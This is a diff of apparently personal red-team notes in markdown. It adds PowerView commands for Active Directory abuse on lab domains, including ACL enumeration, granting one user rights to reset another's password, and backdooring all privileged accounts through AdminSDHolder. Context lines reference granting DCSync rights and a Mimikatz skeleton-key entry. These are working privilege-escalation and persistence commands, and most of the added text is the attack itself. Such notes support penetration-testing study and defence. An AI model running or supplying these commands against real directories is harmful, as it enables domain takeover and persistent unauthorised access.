@@ -368,7 +368,7 @@ misc::skeleton
 
 ```Set-ADACL -DistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' -Principal Mary -GUIDRight DCSync -Verbose``` - AD Module
 
-#### Check ACLs
+# Check ACLs
 NOT WORKING!! In Progress...
 ```Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'Mary'}```
 
@@ -385,7 +385,19 @@ From PowerView notes:
 ```Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')```
 
 Note:  ```Where-Object```  ==  ``` ? ```
+# Working from Powerview:
+#### enumerate who has rights to the 'matt' user in 'testlab.local', resolving rights GUIDs to names
+```Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local```
 
+#### grant user 'will' the rights to change 'matt's password
+```Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose```
+
+#### audit the permissions of AdminSDHolder, resolving GUIDs
+```Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs```
+
+#### backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
+```Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All```
+* * *
 #### Recurse through all ACEs for user/group
 This appends the resolved user or group name to each ACE and recurses through:
 ```
